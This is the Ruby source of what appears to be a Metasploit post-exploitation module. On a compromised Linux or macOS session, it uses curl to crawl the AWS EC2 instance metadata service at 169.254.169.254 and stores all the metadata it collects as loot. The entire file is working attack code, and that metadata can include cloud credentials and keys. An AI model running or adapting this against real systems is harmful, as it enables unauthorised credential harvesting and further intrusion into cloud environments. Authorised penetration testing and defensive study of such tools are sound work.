##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Enumerate AWS EC2 instance metadata',
        'Description'   => %q(
          This module will attempt to connect to the AWS EC2 instance metadata service
          and crawl and collect all metadata known about the session'd host.
    ),
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
        ],
        # TODO: is there a way to do this on Windows?
        'Platform'      => %w(linux osx unix),
        'SessionTypes'  => %w(shell meterpreter),
        'References'    =>
          [
            [ 'URL', 'http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html' ]
          ]
      )
    )
    register_advanced_options(
      [
        OptString.new('TARGETURI', [true, 'AWS EC2 Instance metadata URI', 'http://169.254.169.254/latest/meta-data/ '])
      ]
    )
  end

  def target_uri
    begin
      @target_uri ||= URI(datastore['TARGETURI'])
    rescue ::URI::InvalidURIError
      print_error "Invalid URI: #{datastore['TARGETURI'].inspect}"
      raise Msf::OptionValidateError.new(['TARGETURI'])
    end
  end

  def check_curl
    unless cmd_exec("curl --version") =~ %r{^curl \d}
      fail_with(Failure::BadConfig, 'curl is not installed')
    end
  end

  def check_aws_metadata
    resp = simple_get(target_uri)
    unless resp =~ /^instance-id.$/m
      fail_with(Failure::BadConfig, "Session does not appear to be on an AWS EC2 instance")
    end
    resp
  end

  def get_aws_metadata(base_uri, base_resp)
    r = {}
    base_resp.split(/\r\n/).each do |l|
      new_uri = base_uri.merge("./#{l}")
      if l =~ %r{/$}
        # handle a directory
        r[l.gsub(%r{/$}, '')] = get_aws_metadata(new_uri, simple_get(new_uri))
      elsif new_uri.to_s =~ %r{/public-keys/} && /^(?<key_id>\d+)=/ =~ l
        # special case handling of the public-keys endpoint
        key_uri = new_uri.merge("./#{key_id}/")
        key_resp = simple_get(key_uri)
        r[key_id] = get_aws_metadata(key_uri, key_resp)
      else
        r[l] = simple_get(new_uri)
      end
    end
    r
  end

  def simple_get(url)
    vprint_status("Fetching #{url}")
    cmd_exec("curl #{url}")
  end

  def run
    check_curl
    resp = check_aws_metadata
    metadata = get_aws_metadata(target_uri, resp)
    metadata_json = JSON.pretty_generate(metadata)
    file = store_loot("aws.ec2.instance.metadata", "text/json", session, metadata_json, "aws_ec2_instance_metadata.json", "AWS EC2 Instance Metadata")
    if datastore['VERBOSE']
      vprint_good("AWS EC2 instance metadata")
      print_line(metadata_json)
    end
    print_good("Saved AWS EC2 instance metadata to to #{file}")
  end
end
